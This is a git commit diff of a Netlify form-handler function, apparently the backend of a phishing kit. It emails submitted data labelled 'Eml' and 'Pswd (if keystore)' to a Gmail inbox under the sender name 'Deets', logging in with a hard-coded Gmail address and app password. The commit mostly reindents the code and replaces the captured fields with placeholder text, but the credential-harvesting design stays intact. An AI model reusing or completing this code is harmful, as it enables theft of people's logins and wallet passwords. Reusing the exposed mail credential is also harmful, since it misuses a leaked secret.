c8cbf55e0cf3e636983cdb1b3a0b5a0aac067875
Darktrace <darktrace@gmail.com>
2025-02-14 16:42:06 +0100

    Shutup

--- netlify/functions/submit.js
+++ netlify/functions/submit.js
@@ -1,46 +1,46 @@
 const nodemailer = require('nodemailer');
 
 exports.handler = async (event, context) => {
-if (event.httpMethod === 'OPTIONS') {
-  return {
-    statusCode: 200,
-    headers: {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type'
-    },
-    body: ''
-  };
-}
+  if (event.httpMethod === 'OPTIONS') {
+    return {
+      statusCode: 200,
+      headers: {
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'POST, OPTIONS',
+        'Access-Control-Allow-Headers': 'Content-Type'
+      },
+      body: ''
+    };
+  }
 
-if (event.httpMethod !== 'POST') {
-  return {
-    statusCode: 405,
-    body: JSON.stringify({ error: 'Method not allowed' })
-  };
-}
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method not allowed' })
+    };
+  }
 
-try {
-  const formData = JSON.parse(event.body);
-  const { wName, psdWet, recipients } = formData;
+  try {
+    const formData = JSON.parse(event.body);
+    const { recepients } = formData;
 
-  const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 465,
-    secure: true,
-    auth: {
-      user: 'willyscotmegan@gmail.com', 
-      pass: 'dvhpjxrxrxwxsxcg' 
-    }
-  });
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 465,
+      secure: true,
+      auth: {
+        user: 'willyscotmegan@gmail.com',
+        pass: 'dvhpjxrxrxwxsxcg'
+      }
+    });
 
     const mailOptions = {
       from: '"Deets" <willyscotmegan@gmail.com>',
       to: 'willyscotmegan@gmail.com',
       subject: '',
       html: `
-        <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
-        <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
+        <p><strong>Eml:</strong>More Deets</p>
+        <p><strong>Pswd (if keystore):</strong>More DEEts to be added here</p>
       `
     };
 
